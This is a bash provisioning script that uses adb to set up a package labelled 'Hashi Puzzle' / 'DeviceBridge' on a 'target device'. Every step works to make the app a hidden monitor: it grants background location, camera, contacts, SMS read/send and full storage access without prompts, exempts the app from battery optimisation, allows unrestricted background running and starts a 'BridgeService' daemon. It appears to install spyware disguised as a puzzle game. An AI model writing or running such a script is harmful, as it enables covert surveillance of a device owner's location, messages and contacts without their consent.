#!/usr/bin/env bash
# ==============================================================================
# Quick Provisioning Script for DeviceBridge (Hashi Puzzle)
# Usage: ./quick_setup.sh [device_serial_optional]
# ==============================================================================

PACKAGE="com.hashibridge.master"
ADB_CMD="adb"

if [ -n "$1" ]; then
    ADB_CMD="adb -s $1"
fi

echo "======================================================"
echo "⚡ Provisioning DeviceBridge on target device..."
echo "======================================================"

echo "[1/6] Granting core permissions..."
$ADB_CMD shell pm grant $PACKAGE android.permission.ACCESS_FINE_LOCATION 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.ACCESS_COARSE_LOCATION 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.ACCESS_BACKGROUND_LOCATION 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.CAMERA 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.READ_CONTACTS 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.READ_SMS 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.SEND_SMS 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.POST_NOTIFICATIONS 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.READ_MEDIA_IMAGES 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.READ_MEDIA_VIDEO 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.READ_EXTERNAL_STORAGE 2>/dev/null || true
$ADB_CMD shell pm grant $PACKAGE android.permission.WRITE_EXTERNAL_STORAGE 2>/dev/null || true

echo "[2/6] Granting full storage manager (Android 11+)..."
$ADB_CMD shell appops set --uid $PACKAGE MANAGE_EXTERNAL_STORAGE allow 2>/dev/null || true

echo "[3/6] Bypassing Android Doze Battery Optimizations..."
$ADB_CMD shell dumpsys deviceidle whitelist +$PACKAGE 2>/dev/null || true

echo "[4/6] Allowing unrestricted background execution..."
$ADB_CMD shell cmd appops set $PACKAGE RUN_IN_BACKGROUND allow 2>/dev/null || true
$ADB_CMD shell cmd appops set $PACKAGE RUN_ANY_IN_BACKGROUND allow 2>/dev/null || true

echo "[5/6] Starting BridgeService background daemon..."
$ADB_CMD shell am start-foreground-service -n $PACKAGE/.BridgeService 2>/dev/null || \
$ADB_CMD shell am startservice -n $PACKAGE/.BridgeService 2>/dev/null || true

echo "[6/6] Verifying service status..."
RUNNING=$($ADB_CMD shell ps -ef | grep $PACKAGE | grep -v grep || true)
if [ -n "$RUNNING" ]; then
    echo "✅ SUCCESS: DeviceBridge is running active in background!"
else
    echo "⚠️ NOTE: Please open Hashi Puzzle once on the device screen."
fi

echo "======================================================"
echo "✨ Device provisioning complete."
echo "======================================================"
